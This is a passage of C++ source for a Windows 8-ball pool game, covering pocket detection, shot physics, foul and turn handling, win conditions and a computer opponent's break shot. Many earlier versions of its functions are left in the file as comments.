        bool ballPocketedThisCheck = false;
        // For each ball not already pocketed:
        for (auto& b : balls) {
            if (b.isPocketed)
                continue;

            // Check against each pocket
            for (int p = 0; p < 6; ++p) {
                float dx = b.x - pocketPositions[p].x;
                float dy = b.y - pocketPositions[p].y;
                if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                    // It's in the pocket—remove it from play
                    // If it's the 8?ball, remember which pocket it went into
                    if (b.id == 8) {
                        lastEightBallPocketIndex = p;   // <-- Must set here!
                    }
                    b.isPocketed = true;
                    b.vx = b.vy = 0.0f;           // kill any movement
                    pocketedThisTurn.push_back(b.id);
                    anyPocketed = true;

                    // --- FIX: Insert your sound logic here ---
                    // The 'if' guard prevents multiple sounds on a multi-ball break.
                    if (!ballPocketedThisCheck) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""pocket.wav"")).detach();
                        ballPocketedThisCheck = true;
                    }
                    // --- End Sound Fix ---

                    break;  // no need to check other pockets for this ball
                }
            }
        }
        return anyPocketed;
    }

    bool AreBallsMoving() {
        for (size_t i = 0; i < balls.size(); ++i) {
            if (!balls[i].isPocketed && (balls[i].vx != 0 || balls[i].vy != 0)) {
                return true;
            }
        }
        return false;
    }

    void RespawnCueBall(bool behindHeadstring) {
        Ball* cueBall = GetCueBall();
        if (cueBall) {
            // Determine the initial target position
            float targetX, targetY;
            if (behindHeadstring) {
                targetX = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f;
                targetY = TABLE_TOP + TABLE_HEIGHT / 2.0f;
            }
            else {
                targetX = TABLE_LEFT + TABLE_WIDTH / 2.0f;
                targetY = TABLE_TOP + TABLE_HEIGHT / 2.0f;
            }

            // FOOLPROOF FIX: Check if the target spot is valid. If not, nudge it until it is.
            int attempts = 0;
            while (!IsValidCueBallPosition(targetX, targetY, behindHeadstring) && attempts < 100) {
                // If the spot is occupied, try nudging the ball slightly.
                targetX += (static_cast<float>(rand() % 100 - 50) / 50.0f) * BALL_RADIUS;
                targetY += (static_cast<float>(rand() % 100 - 50) / 50.0f) * BALL_RADIUS;
                // Clamp to stay within reasonable bounds
                targetX = std::max(TABLE_LEFT + BALL_RADIUS, std::min(targetX, TABLE_RIGHT - BALL_RADIUS));
                targetY = std::max(TABLE_TOP + BALL_RADIUS, std::min(targetY, TABLE_BOTTOM - BALL_RADIUS));
                attempts++;
            }

            // Set the final, valid position.
            cueBall->x = targetX;
            cueBall->y = targetY;
            cueBall->vx = 0;
            cueBall->vy = 0;
            cueBall->isPocketed = false;

            // Set the correct game state for ball-in-hand.
            if (currentPlayer == 1) {
                currentGameState = BALL_IN_HAND_P1;
                aiTurnPending = false;
            }
            else {
                currentGameState = BALL_IN_HAND_P2;
                if (isPlayer2AI) {
                    aiTurnPending = true;
                }
            }
        }
    }


    // --- Game Logic ---

    void ApplyShot(float power, float angle, float spinX, float spinY) {
        Ball* cueBall = GetCueBall();
        if (cueBall) {

            // --- Play Cue Strike Sound (Threaded) ---
            if (power > 0.1f) { // Only play if it's an audible shot
                std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
            }
            // --- End Sound ---

            cueBall->vx = cosf(angle) * power;
            cueBall->vy = sinf(angle) * power;

            // Apply English (Spin) - Simplified effect (Unchanged)
            cueBall->vx += sinf(angle) * spinY * 0.5f;
            cueBall->vy -= cosf(angle) * spinY * 0.5f;
            cueBall->vx -= cosf(angle) * spinX * 0.5f;
            cueBall->vy -= sinf(angle) * spinX * 0.5f;

            // Store spin (Unchanged)
            cueSpinX = spinX;
            cueSpinY = spinY;

            // --- Reset Foul Tracking flags for the new shot ---
            // (Also reset in LBUTTONUP, but good to ensure here too)
            firstHitBallIdThisShot = -1;      // No ball hit yet
            cueHitObjectBallThisShot = false; // Cue hasn't hit anything yet
            railHitAfterContact = false;     // No rail hit after contact yet
            // --- End Reset ---

                    // If this was the opening break shot, clear the flag
            if (isOpeningBreakShot) {
                isOpeningBreakShot = false; // Mark opening break as taken
            }
        }
    }


    // ---------------------------------------------------------------------
    //  ProcessShotResults()
    // ---------------------------------------------------------------------
    void ProcessShotResults() {
        bool cueBallPocketed = false;
        bool eightBallPocketed = false;
        bool playerContinuesTurn = false;

        // --- Step 1: Update Ball Counts FIRST (THE CRITICAL FIX) ---
        // We must update the score before any other game logic runs.
        PlayerInfo& shootingPlayer = (currentPlayer == 1) ? player1Info : player2Info;
        int ownBallsPocketedThisTurn = 0;

        for (int id : pocketedThisTurn) {
            Ball* b = GetBallById(id);
            if (!b) continue;

            if (b->id == 0) {
                cueBallPocketed = true;
            }
            else if (b->id == 8) {
                eightBallPocketed = true;
            }
            else {
                // This is a numbered ball. Update the pocketed count for the correct player.
                if (b->type == player1Info.assignedType && player1Info.assignedType != BallType::NONE) {
                    player1Info.ballsPocketedCount++;
                }
                else if (b->type == player2Info.assignedType && player2Info.assignedType != BallType::NONE) {
                    player2Info.ballsPocketedCount++;
                }

                if (b->type == shootingPlayer.assignedType) {
                    ownBallsPocketedThisTurn++;
                }
            }
        }

        if (ownBallsPocketedThisTurn > 0) {
            playerContinuesTurn = true;
        }

        // --- Step 2: Handle Game-Ending 8-Ball Shot ---
        // Now that the score is updated, this check will have the correct information.
        if (eightBallPocketed) {
            CheckGameOverConditions(true, cueBallPocketed);
            if (currentGameState == GAME_OVER) {
                pocketedThisTurn.clear();
                return;
            }
        }

        // --- Step 3: Check for Fouls ---
        bool turnFoul = false;
        if (cueBallPocketed) {
            turnFoul = true;
        }
        else {
            Ball* firstHit = GetBallById(firstHitBallIdThisShot);
            if (!firstHit) { // Rule: Hitting nothing is a foul.
                turnFoul = true;
            }
            else { // Rule: Hitting the wrong ball type is a foul.
                if (player1Info.assignedType != BallType::NONE) { // Colors are assigned.
                    // We check if the player WAS on the 8-ball BEFORE this shot.
                    bool wasOnEightBall = (shootingPlayer.assignedType != BallType::NONE && (shootingPlayer.ballsPocketedCount - ownBallsPocketedThisTurn) >= 7);
                    if (wasOnEightBall) {
                        if (firstHit->id != 8) turnFoul = true;
                    }
                    else {
                        if (firstHit->type != shootingPlayer.assignedType) turnFoul = true;
                    }
                }
            }
        } //reenable below disabled for debugging
        //if (!turnFoul && cueHitObjectBallThisShot && !railHitAfterContact && pocketedThisTurn.empty()) {
            //turnFoul = true;
        //}
        foulCommitted = turnFoul;

        // --- Step 4: Final State Transition ---
        if (foulCommitted) {
            SwitchTurns();
            RespawnCueBall(false);
        }
        else if (player1Info.assignedType == BallType::NONE && !pocketedThisTurn.empty() && !cueBallPocketed) {
            // Assign types on the break.
            for (int id : pocketedThisTurn) {
                Ball* b = GetBallById(id);
                if (b && b->type != BallType::EIGHT_BALL) {
                    AssignPlayerBallTypes(b->type);
                    break;
                }
            }
            CheckAndTransitionToPocketChoice(currentPlayer);
        }
        else if (playerContinuesTurn) {
            // The player's turn continues. Now the check will work correctly.
            CheckAndTransitionToPocketChoice(currentPlayer);
        }
        else {
            SwitchTurns();
        }

        pocketedThisTurn.clear();
    }

    /*
    // --- Step 3: Final State Transition ---
    if (foulCommitted) {
        SwitchTurns();
        RespawnCueBall(false);
    }
    else if (playerContinuesTurn) {
        CheckAndTransitionToPocketChoice(currentPlayer);
    }
    else {
        SwitchTurns();
    }

    pocketedThisTurn.clear();
    } */

    //  Assign groups AND optionally give the shooter his first count.
    bool AssignPlayerBallTypes(BallType firstPocketedType, bool creditShooter /*= true*/)
    {
        if (firstPocketedType != SOLID && firstPocketedType != STRIPE)
            return false;                                 // safety

        /* ---------------------------------------------------------
           1.  Decide the groups
        --------------------------------------------------------- */
        if (currentPlayer == 1)
        {
            player1Info.assignedType = firstPocketedType;
            player2Info.assignedType =
                (firstPocketedType == SOLID) ? STRIPE : SOLID;
        }
        else
        {
            player2Info.assignedType = firstPocketedType;
            player1Info.assignedType =
                (firstPocketedType == SOLID) ? STRIPE : SOLID;
        }

        /* ---------------------------------------------------------
           2.  Count the very ball that made the assignment
        --------------------------------------------------------- */
        if (creditShooter)
        {
            if (currentPlayer == 1)
                ++player1Info.ballsPocketedCount;
            else
                ++player2Info.ballsPocketedCount;
        }
        return true;
    }

    /*bool AssignPlayerBallTypes(BallType firstPocketedType) {
        if (firstPocketedType == BallType::SOLID || firstPocketedType == BallType::STRIPE) {
            if (currentPlayer == 1) {
                player1Info.assignedType = firstPocketedType;
                player2Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
            }
            else {
                player2Info.assignedType = firstPocketedType;
                player1Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
            }
            return true; // Assignment was successful
        }
        return false; // No assignment made (e.g., 8-ball was pocketed on break)
    }*/
    // If 8-ball was first (illegal on break generally), rules vary.
    // Here, we might ignore assignment until a solid/stripe is pocketed legally.
    // Or assign based on what *else* was pocketed, if anything.
    // Simplification: Assignment only happens on SOLID or STRIPE first pocket.


    // --- Called in ProcessShotResults() after pocket detection ---
    void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        // Only care if the 8?ball really went in:
        if (!eightBallPocketed) return;

        // Who’s shooting now?
        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;

        // Which pocket did we CALL?
        int called = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        // Which pocket did it ACTUALLY fall into?
        int actual = lastEightBallPocketIndex;

        // Check legality: must have called a pocket ?0, must match actual,
        // must have pocketed all 7 of your balls first, and must not have scratched.
        bool legal = (called >= 0)
            && (called == actual)
            && (shooter.ballsPocketedCount >= 7)
            && (!cueBallPocketed);

        // Build a message that shows both values for debugging/tracing:
        if (legal) {
            gameOverMessage = shooter.name
                + L"" Wins! ""
                + L""(Called: "" + std::to_wstring(called)
                + L"", Actual: "" + std::to_wstring(actual) + L"")"";
        }
        else {
            gameOverMessage = opponent.name
                + L"" Wins! (Illegal 8-Ball) ""
                + L""(Called: "" + std::to_wstring(called)
                + L"", Actual: "" + std::to_wstring(actual) + L"")"";
        }

        currentGameState = GAME_OVER;
    }



    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed) {
        if (!eightBallPocketed) return;

        PlayerInfo& shootingPlayer = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponentPlayer = (currentPlayer == 1) ? player2Info : player1Info;

        // Handle 8-ball on break: re-spot and continue.
        if (player1Info.assignedType == BallType::NONE) {
            Ball* b = GetBallById(8);
            if (b) { b->isPocketed = false; b->x = RACK_POS_X; b->y = RACK_POS_Y; b->vx = b->vy = 0; }
            if (cueBallPocketed) foulCommitted = true;
            return;
        }

        // --- FOOLPROOF WIN/LOSS LOGIC ---
        bool wasOnEightBall = IsPlayerOnEightBall(currentPlayer);
        int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int actualPocket = -1;

        // Find which pocket the 8-ball actually went into.
        for (int id : pocketedThisTurn) {
            if (id == 8) {
                Ball* b = GetBallById(8); // This ball is already marked as pocketed, but we need its last coords.
                if (b) {
                    for (int p_idx = 0; p_idx < 6; ++p_idx) {
                        // Check last known position against pocket centers
                        if (GetDistanceSq(b->x, b->y, pocketPositions[p_idx].x, pocketPositions[p_idx].y) < POCKET_RADIUS * POCKET_RADIUS * 1.5f) {
                            actualPocket = p_idx;
                            break;
                        }
                    }
                }
                break;
            }
        }

        // Evaluate win/loss based on a clear hierarchy of rules.
        if (!wasOnEightBall) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (8-Ball Pocketed Early)"";
        }
        else if (cueBallPocketed) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (Scratched on 8-Ball)"";
        }
        else if (calledPocket == -1) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (Pocket Not Called)"";
        }
        else if (actualPocket != calledPocket) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (8-Ball in Wrong Pocket)"";
        }
        else {
            // WIN! All loss conditions failed, this must be a legal win.
            gameOverMessage = shootingPlayer.name + L"" Wins!"";
        }

        currentGameState = GAME_OVER;
    }*/

    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        if (!eightBallPocketed) return;

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;
        // Which pocket did we call?
        int called = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        // Which pocket did the ball really fall into?
        int actual = lastEightBallPocketIndex;

        // Legal victory only if:
        //  1) Shooter had already pocketed 7 of their object balls,
        //  2) They called a pocket,
        //  3) The 8?ball actually fell into that same pocket,
        //  4) They did not scratch on the 8?ball.
        bool legal =
            (shooter.ballsPocketedCount >= 7) &&
            (called >= 0) &&
            (called == actual) &&
            (!cueBallPocketed);

        if (legal) {
            gameOverMessage = shooter.name + L"" Wins! ""
                L""(called: "" + std::to_wstring(called) +
                L"", actual: "" + std::to_wstring(actual) + L"")"";
        }
        else {
            gameOverMessage = opponent.name + L"" Wins! (illegal 8-ball) ""
            // For debugging you can append:
            + L"" (called: "" + std::to_wstring(called)
            + L"", actual: "" + std::to_wstring(actual) + L"")"";
        }

        currentGameState = GAME_OVER;
    }*/

    // ????????????????????????????????????????????????????????????????
    //  CheckGameOverConditions()
    //     – Called when the 8-ball has fallen.
    //     – Decides who wins and builds the gameOverMessage.
    // ????????????????????????????????????????????????????????????????
    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        if (!eightBallPocketed) return;                     // safety

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;

        int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int actualPocket = lastEightBallPocketIndex;

        bool clearedSeven = (shooter.ballsPocketedCount >= 7);
        bool noScratch = !cueBallPocketed;
        bool callMade = (calledPocket >= 0);

        // helper ? turn “-1” into ""None"" for readability
        auto pocketToStr = [](int idx) -> std::wstring
        {
            return (idx >= 0) ? std::to_wstring(idx) : L""None"";
        };

        if (clearedSeven && noScratch && callMade && actualPocket == calledPocket)
        {
            // legitimate win
            gameOverMessage =
                shooter.name +
                L"" Wins! (Called pocket: "" + pocketToStr(calledPocket) +
                L"", Actual pocket: "" + pocketToStr(actualPocket) + L"")"";
        }
        else
        {
            // wrong pocket, scratch, or early 8-ball
            gameOverMessage =
                opponent.name +
                L"" Wins! (Called pocket: "" + pocketToStr(calledPocket) +
                L"", Actual pocket: "" + pocketToStr(actualPocket) + L"")"";
        }

        currentGameState = GAME_OVER;
    }*/

    /* void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed) {
        if (!eightBallPocketed) return; // Only when 8-ball actually pocketed

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;
        bool      onEightRoll = IsPlayerOnEightBall(currentPlayer);
        int       calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int       actualPocket = -1;
        Ball* bEight = GetBallById(8);

        // locate which hole the 8-ball went into
        if (bEight) {
            for (int i = 0; i < 6; ++i) {
                if (GetDistanceSq(bEight->x, bEight->y,
                    pocketPositions[i].x, pocketPositions[i].y)
                    < POCKET_RADIUS * POCKET_RADIUS * 1.5f) {
                    actualPocket = i; break;
                }
            }
        }

        // 1) On break / pre-assignment: re-spot & continue
        if (player1Info.assignedType == BallType::NONE) {
            if (bEight) {
                bEight->isPocketed = false;
                bEight->x = RACK_POS_X; bEight->y = RACK_POS_Y;
                bEight->vx = bEight->vy = 0;
            }
            if (cueBallPocketed) foulCommitted = true;
            return;
        }

        // 2) Loss if pocketed 8 early
        if (!onEightRoll) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" pocketed 8-ball early)"";
        }
        // 3) Loss if scratched
        else if (cueBallPocketed) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" scratched on 8-ball)"";
        }
        // 4) Loss if no pocket call
        else if (calledPocket < 0) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" did not call a pocket)"";
        }
        // 5) Loss if in wrong pocket
        else if (actualPocket != calledPocket) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" 8-ball in wrong pocket)"";
        }
        // 6) Otherwise, valid win
        else {
            gameOverMessage = shooter.name + L"" Wins!"";
        }

        currentGameState = GAME_OVER;
    } */


    // Switch the shooter, handle fouls and decide what state we go to next.
    // ────────────────────────────────────────────────────────────────
    //  SwitchTurns – final version (arrow–leak bug fixed)
    // ────────────────────────────────────────────────────────────────
    void SwitchTurns()
    {
        /* --------------------------------------------------------- */
        /* 1.  Hand the table over to the other player               */
        /* --------------------------------------------------------- */
        currentPlayer = (currentPlayer == 1) ? 2 : 1;

        /* --------------------------------------------------------- */
        /* 2.  Generic per–turn resets                               */
        /* --------------------------------------------------------- */
        isAiming = false;
        shotPower = 0.0f;
        currentlyHoveredPocket = -1;

        /* --------------------------------------------------------- */
        /* 3.  Wipe every previous pocket call                       */
        /*    (the new shooter will choose again if needed)          */
        /* --------------------------------------------------------- */
        calledPocketP1 = -1;
        calledPocketP2 = -1;
        pocketCallMessage.clear();

        /* --------------------------------------------------------- */
        /* 4.  Handle fouls — cue-ball in hand overrides everything  */
        /* --------------------------------------------------------- */
        if (foulCommitted)
        {
            if (currentPlayer == 1)            // human
            {
                currentGameState = BALL_IN_HAND_P1;
                aiTurnPending = false;
            }
            else                               // P2
            {
                currentGameState = BALL_IN_HAND_P2;
                aiTurnPending = isPlayer2AI;   // AI will place cue-ball
            }

            foulCommitted = false;
            return;                            // we're done for this frame
        }

        /* --------------------------------------------------------- */
        /* 5.  Normal flow                                           */
        /*    Will put us in  ∘ PLAYER?_TURN                         */
        /*                    ∘ CHOOSING_POCKET_P?                   */
        /*                    ∘ AI_THINKING  (for CPU)               */
        /* --------------------------------------------------------- */
        CheckAndTransitionToPocketChoice(currentPlayer);
    }


    void AIBreakShot() {
        Ball* cueBall = GetCueBall();
        if (!cueBall) return;

        // This function is called when it's AI's turn for the opening break and state is PRE_BREAK_PLACEMENT.
        // AI will place the cue ball and then plan the shot.
        if (isOpeningBreakShot && currentGameState == PRE_BREAK_PLACEMENT) {
            // Place cue ball in the kitchen randomly
            /*float kitchenMinX = TABLE_LEFT + BALL_RADIUS; // [cite: 1071, 1072, 1587]
            float kitchenMaxX = HEADSTRING_X - BALL_RADIUS; // [cite: 1072, 1078, 1588]
            float kitchenMinY = TABLE_TOP + BALL_RADIUS; // [cite: 1071, 1072, 1588]
            float kitchenMaxY = TABLE_BOTTOM - BALL_RADIUS; // [cite: 1072, 1073, 1589]*/

            // --- AI Places Cue Ball for Break ---
    // Decide if placing center or side. For simplicity, let's try placing slightly off-center
    // towards one side for a more angled break, or center for direct apex hit.
    // A common strategy is to hit the second ball of the rack.

            float placementY = RACK_POS_Y; // Align vertically with the rack center
            float placementX;

            // Randomly choose a side or center-ish placement for variation.
            int placementChoice = rand() % 3; // 0: Left-ish, 1: Center-ish, 2: Right-ish in kitchen

            if (placementChoice == 0) { // Left-ish
                placementX = HEADSTRING_X - (TABLE_WIDTH * 0.05f) - (BALL_RADIUS * (1 + (rand() % 3))); // Place slightly to the left within kitchen
            }
            else if (placementChoice == 2) { // Right-ish
                placementX = HEADSTRING_X - (TABLE_WIDTH * 0.05f) + (BALL_RADIUS * (1 + (rand() % 3))); // Place slightly to the right within kitchen
            }
            else { // Center-ish
                placementX = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f; // Roughly center of kitchen
            }
            placementX = std::max(TABLE_LEFT + BALL_RADIUS + 1.0f, std::min(placementX, HEADSTRING_X - BALL_RADIUS - 1.0f)); // Clamp within kitchen X

            bool validPos = false;
            int attempts = 0;
            while (!validPos && attempts < 100) {
                /*cueBall->x = kitchenMinX + static_cast<float>(rand()) / (static_cast<float>(RAND_MAX) / (kitchenMaxX - kitchenMinX)); // [cite: 1589]
                cueBall->y = kitchenMinY + static_cast<float>(rand()) / (static_cast<float>(RAND_MAX) / (kitchenMaxY - kitchenMinY)); // [cite: 1590]
                if (IsValidCueBallPosition(cueBall->x, cueBall->y, true)) { // [cite: 1591]
                    validPos = true; // [cite: 1591]*/
                    // Try the chosen X, but vary Y slightly to find a clear spot
                cueBall->x = placementX;
                cueBall->y = placementY + (static_cast<float>(rand() % 100 - 50) / 100.0f) * BALL_RADIUS * 2.0f; // Vary Y a bit
                cueBall->y = std::max(TABLE_TOP + BALL_RADIUS + 1.0f, std::min(cueBall->y, TABLE_BOTTOM - BALL_RADIUS - 1.0f)); // Clamp Y

                if (IsValidCueBallPosition(cueBall->x, cueBall->y, true /* behind headstring */)) {
                    validPos = true;
                }
                attempts++; // [cite: 1592]
            }
            if (!validPos) {
                // Fallback position
                /*cueBall->x = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f; // [cite: 1071, 1078, 1593]
                cueBall->y = (TABLE_TOP + TABLE_BOTTOM) * 0.5f; // [cite: 1071, 1073, 1594]
                if (!IsValidCueBallPosition(cueBall->x, cueBall->y, true)) { // [cite: 1594]
                    cueBall->x = HEADSTRING_X - BALL_RADIUS * 2; // [cite: 1072, 1078, 1594]
                    cueBall->y = RACK_POS_Y; // [cite: 1080, 1595]
                }
            }
            cueBall->vx = 0; // [cite: 1595]
            cueBall->vy = 0; // [cite: 1596]

            // Plan a break shot: aim at the center of the rack (apex ball)
            float targetX = RACK_POS_X; // [cite: 1079] Aim for the apex ball X-coordinate
            float targetY = RACK_POS_Y; // [cite: 1080] Aim for the apex ball Y-coordinate

            float dx = targetX - cueBall->x; // [cite: 1599]
            float dy = targetY - cueBall->y; // [cite: 1600]
            float shotAngle = atan2f(dy, dx); // [cite: 1600]
            float shotPowerValue = MAX_SHOT_POWER; // [cite: 1076, 1600] Use MAX_SHOT_POWER*/

                cueBall->x = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.75f; // A default safe spot in kitchen
                cueBall->y = RACK_POS_Y;
            }
            cueBall->vx = 0; cueBall->vy = 0;

            // --- AI Plans the Break Shot ---
            float targetX, targetY;
            // If cue ball is near center of kitchen width, aim for apex.
            // Otherwise, aim for the second ball on the side the cue ball is on (for a cut break).
            float kitchenCenterRegion = (HEADSTRING_X - TABLE_LEFT) * 0.3f; // Define a ""center"" region
            if (std::abs(cueBall->x - (TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) / 2.0f)) < kitchenCenterRegion / 2.0f) {
                // Center-ish placement: Aim for the apex ball (ball ID 1 or first ball in rack)
                targetX = RACK_POS_X; // Apex ball X
                targetY = RACK_POS_Y; // Apex ball Y
            }
            else {
                // Side placement: Aim to hit the ""second"" ball of the rack for a wider spread.
                // This is a simplification. A more robust way is to find the actual second ball.
                // For now, aim slightly off the apex towards the side the cue ball is on.
                targetX = RACK_POS_X + BALL_RADIUS * 2.0f * 0.866f; // X of the second row of balls
                targetY = RACK_POS_Y + ((cueBall->y > RACK_POS_Y) ? -BALL_RADIUS : BALL_RADIUS); // Aim at the upper or lower of the two second-row balls
            }

            float dx = targetX - cueBall->x;
            float dy = targetY - cueBall->y;
            float shotAngle = atan2f(dy, dx);
            float shotPowerValue = MAX_SHOT_POWER * (0.9f + (rand() % 11) / 100.0f); // Slightly vary max power

            // Store planned shot details for the AI
            /*aiPlannedShotDetails.angle = shotAngle; // [cite: 1102, 1601]
            aiPlannedShotDetails.power = shotPowerValue; // [cite: 1102, 1601]
            aiPlannedShotDetails.spinX = 0.0f; // [cite: 1102, 1601] No spin for a standard power break
            aiPlannedShotDetails.spinY = 0.0f; // [cite: 1103, 1602]
            aiPlannedShotDetails.isValid = true; // [cite: 1103, 1602]*/

            aiPlannedShotDetails.angle = shotAngle;
            aiPlannedShotDetails.power = shotPowerValue;
            aiPlannedShotDetails.spinX = 0.0f; // No spin for break usually
            aiPlannedShotDetails.spinY = 0.0f;
            aiPlannedShotDetails.isValid = true;

            // Update global cue parameters for immediate visual feedback if DrawAimingAids uses them
            /*::cueAngle = aiPlannedShotDetails.angle;      // [cite: 1109, 1603] Update global cueAngle
            ::shotPower = aiPlannedShotDetails.power;     // [cite: 1109, 1604] Update global shotPower
            ::cueSpinX = aiPlannedShotDetails.spinX;    // [cite: 1109]
            ::cueSpinY = aiPlannedShotDetails.spinY;    // [cite: 1110]*/

            ::cueAngle = aiPlannedShotDetails.angle;
            ::shotPower = aiPlannedShotDetails.power;
            ::cueSpinX = aiPlannedShotDetails.spinX;
            ::cueSpinY = aiPlannedShotDetails.spinY;

            // Set up for AI display via GameUpdate
            /*aiIsDisplayingAim = true;                   // [cite: 1104] Enable AI aiming visualization
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES; // [cite: 1105] Set duration for display

            currentGameState = AI_THINKING; // [cite: 1081] Transition to AI_THINKING state.
                                            // GameUpdate will handle the aiAimDisplayFramesLeft countdown
                                            // and then execute the shot using aiPlannedShotDetails.
                                            // isOpeningBreakShot will be set to false within ApplyShot.

            // No immediate ApplyShot or sound here; GameUpdate's AI execution logic will handle it.*/

            aiIsDisplayingAim = true;
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES;
            currentGameState = AI_THINKING; // State changes to AI_THINKING, GameUpdate will handle shot execution after display
            aiTurnPending = false;

            return; // The break shot is now planned and will be executed by GameUpdate
        }

        // 2. If not in PRE_BREAK_PLACEMENT (e.g., if this function were called at other times,
        //    though current game logic only calls it for PRE_BREAK_PLACEMENT)
        //    This part can be extended if AIBreakShot needs to handle other scenarios.
        //    For now, the primary logic is above.
    }

    // --- Helper Functions ---

    Ball* GetBallById(int id) {
        for (size_t i = 0; i < balls.size(); ++i) {
            if (balls[i].id == id) {
                return &balls[i];
            }
        }
        return nullptr;
    }

    Ball* GetCueBall() {
        return GetBallById(0);
    }

    float GetDistance(float x1, float y1, float x2, float y2) {
        return sqrtf(GetDistanceSq(x1, y1, x2, y2));
    }

    float GetDistanceSq(float x1, float y1, float x2, float y2) {
        float dx = x2 - x1;
        float dy = y2 - y1;
        return dx * dx + dy * dy;
    }

    bool IsValidCueBallPosition(float x, float y, bool checkHeadstring) {
        // Basic bounds check (inside cushions)
        float left = TABLE_LEFT + CUSHION_THICKNESS + BALL_RADIUS;
        float right = TABLE_RIGHT - CUSHION_THICKNESS - BALL_RADIUS;
        float top = TABLE_TOP + CUSHION_THICKNESS + BALL_RADIUS;
        float bottom = TABLE_BOTTOM - CUSHION_THICKNESS - BALL_RADIUS;

        if (x < left || x > right || y < top || y > bottom) {
            return false;
        }

        // Check headstring restriction if needed
        if (checkHeadstring && x >= HEADSTRING_X) {
            return false;
        }

        // Check overlap with other balls
        for (size_t i = 0; i < balls.size(); ++i) {
            if (balls[i].id != 0 && !balls[i].isPocketed) { // Don't check against itself or pocketed balls
                if (GetDistanceSq(x, y, balls[i].x, balls[i].y) < (BALL_RADIUS * 2.0f) * (BALL_RADIUS * 2.0f)) {
                    return false; // Overlapping another ball
                }
            }
        }

        return true;
    }

    // --- NEW HELPER FUNCTION IMPLEMENTATIONS ---

    // Checks if a player has pocketed all their balls and is now on the 8-ball.
    bool IsPlayerOnEightBall(int player) {
        PlayerInfo& playerInfo = (player == 1) ? player1Info : player2Info;
        if (playerInfo.assignedType != BallType::NONE && playerInfo.assignedType != BallType::EIGHT_BALL && playerInfo.ballsPocketedCount >= 7) {
            Ball* eightBall = GetBallById(8);
            return (eightBall && !eightBall->isPocketed);
        }
        return false;
    }

    void CheckAndTransitionToPocketChoice(int playerID) {
        bool needsToCall = IsPlayerOnEightBall(playerID);

        if (needsToCall) {
            if (playerID == 1) { // Human Player 1
                currentGameState = CHOOSING_POCKET_P1;
                pocketCallMessage = player1Info.name + L"": Choose a pocket for the 8-Ball..."";
                if (calledPocketP1 == -1) calledPocketP1 = 2; // Default to bottom-right
            }
            else { // Player 2
                if (isPlayer2AI) {
                    // FOOLPROOF FIX: AI doesn't choose here. It transitions to a thinking state.
                    // AIMakeDecision will handle the choice and the pocket call.
                    currentGameState = AI_THINKING;
                    aiTurnPending = true; // Signal the main loop to run AIMakeDecision
                }
                else { // Human Player 2
                    currentGameState = CHOOSING_POCKET_P2;
                    pocketCallMessage = player2Info.name + L"": Choose a pocket for the 8-Ball..."";
                    if (calledPocketP2 == -1) calledPocketP2 = 2; // Default to bottom-right
                }
            }
        }
        else {
            // Player does not need to call a pocket, proceed to normal turn.
            pocketCallMessage = L"""";
            currentGameState = (playerID == 1) ? PLAYER1_TURN : PLAYER2_TURN;
            if (playerID == 2 && isPlayer2AI) {
                aiTurnPending = true;
            }
        }
    }


    template <typename T>
    void SafeRelease(T** ppT) {
        if (*ppT) {
            (*ppT)->Release();
            *ppT = nullptr;
        }
    }

    // --- CPU Ball?in?Hand Placement --------------------------------
    // Moves the cue ball to a legal ""ball in hand"" position for the AI.
    void AIPlaceCueBall() {
        Ball* cue = GetCueBall();
        if (!cue) return;

        // Simple strategy: place back behind the headstring at the standard break spot
        cue->x = TABLE_LEFT + TABLE_WIDTH * 0.15f;
        cue->y = RACK_POS_Y;
        cue->vx = cue->vy = 0.0f;
    }

    // --- Helper Function for Line Segment Intersection ---
    // Finds intersection point of line segment P1->P2 and line segment P3->P4
    // Returns true if they intersect, false otherwise. Stores intersection point in 'intersection'.
